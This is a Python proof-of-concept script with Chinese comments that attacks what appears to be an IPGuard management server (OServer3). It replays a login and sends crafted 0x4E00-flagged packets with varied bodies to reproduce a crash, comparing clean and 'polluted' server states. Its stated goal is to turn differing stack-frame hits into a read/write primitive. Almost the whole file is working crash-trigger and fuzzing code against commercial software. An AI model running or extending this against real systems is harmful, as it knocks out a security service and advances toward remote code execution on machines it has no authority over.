"""poc_4E00_cache_probe.py — 探究 0x4E00 crash 的"缓存污染"机制

实验:
  A) 清洁状态: 直接发 body=\\x01...(跳过 empty), 看是否依然崩
  B) 污染状态: 先发 body=empty 预热, 然后扫各种 body 看哪些崩
  C) 二阶污染: 同时跑 A 和 B, 对比命中率

期望:
  - 若 A 不崩,B 崩 → empty 是污染源 → 干净状态触发条件更严
  - 若两者都崩 → 我们之前的"empty 才能预热"理论错,该 crash 本就 stateless
  - 不同 body 命中不同栈帧字段 → 给我们 read/write primitive
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


def fresh_send(host, port, user, pwd, cmd, sub, body, flags=0x4600, timeout=15.0):
    try:
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, lr, st, _ = replay_login(s, user, pwd, base_nonce,
                                       show_crypto=False, verbose=False)
        next_nonce = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s)), False
        except (socket.timeout, ConnectionError, OSError):
            return None, True  # crashed
    except Exception as e:
        return {"_err": str(e)}, False
    finally:
        try: s.close()
        except: pass


def check_alive(host, port, timeout=3.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionError, OSError):
        return False


def wait_for_guard(host, port, max_wait=10.0):
    for _ in range(int(max_wait / 0.5)):
        time.sleep(0.5)
        if check_alive(host, port):
            return True
    return False


def fire(host, port, user, pwd, body, label):
    r, crashed = fresh_send(host, port, user, pwd, 0x4014, 6, body, flags=0x4E00)
    tag = "💥 CRASH" if crashed else "no crash"
    print(f"  {label:30s} → {tag}")
    if crashed:
        wait_for_guard(host, port)
    return crashed


def body_sub6(name, v56, v57):
    """v5 里的 body_sub6 格式: 8B header + wcs name"""
    wcs = name.encode("utf-16-le") + b"\x00\x00"
    return struct.pack("<II", v56, v57) + wcs


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    print(f"[*] target {host}:{port}")
    print(f"[*] 提前手动重启 OServer3 服务(SCM stop+start), 确保进入干净状态\n")
    print(f"     等 10s 让 server up...\n")
    for _ in range(20):
        if check_alive(host, port): break
        time.sleep(0.5)

    # === 实验 A: 干净状态直接打 \x01 ===
    print("=" * 70)
    print("A) 清洁状态 — 直接发 body=\\x01\\x00\\x00\\x00 (不预热 empty)")
    print("=" * 70)
    a_crashed = fire(host, port, user, pwd, b"\x01\x00\x00\x00", "x01 plain")

    # 等 server 干净状态
    if a_crashed:
        wait_for_guard(host, port)
        time.sleep(2)

    # === 实验 B: 干净状态打其它 bodies ===
    print()
    print("=" * 70)
    print("B) 清洁状态 — 各种 body 形状(不预热)")
    print("=" * 70)
    test_bodies = [
        ("18B sub6 'X'",  body_sub6("X", 1, 1)),
        ("22B sub6 'C:'", body_sub6("C:", 1, 1)),
        ("8B  \\x01x8",   b"\x01" * 8),
        ("16B AAAA...",   b"A" * 16),
        ("4B DWORD=2",    struct.pack("<I", 2)),
        ("4B DWORD=3",    struct.pack("<I", 3)),
        ("4B DWORD=255",  struct.pack("<I", 255)),
    ]
    b_results = {}
    for label, body in test_bodies:
        # 每次都让 server 处于"刚重启完"状态(等 1 秒让其稳定)
        time.sleep(1)
        crashed = fire(host, port, user, pwd, body, label)
        b_results[label] = crashed

    # === 实验 C: 污染状态 ===
    print()
    print("=" * 70)
    print("C) 污染状态 — 先 body=empty,然后 fuzz")
    print("=" * 70)
    # 先 empty 预热
    fire(host, port, user, pwd, b"", "warm-up empty")
    time.sleep(1)
    c_results = {}
    for label, body in test_bodies:
        time.sleep(0.5)
        crashed = fire(host, port, user, pwd, body, label)
        c_results[label] = crashed

    # === 总结 ===
    print()
    print("=" * 70)
    print("RESULTS:")
    print("=" * 70)
    print(f"  \\x01 alone (clean):         {'💥' if a_crashed else 'OK'}")
    print(f"\n  {'body':<25} {'clean':<10} {'after-empty':<10}")
    print("  " + "-" * 50)
    for label, _ in test_bodies:
        a = b_results.get(label, False)
        b = c_results.get(label, False)
        diff = " ← state-dependent" if a != b else ""
        print(f"  {label:<25} {'💥' if a else '..':<10} {'💥' if b else '..':<10}{diff}")


if __name__ == "__main__":
    main()
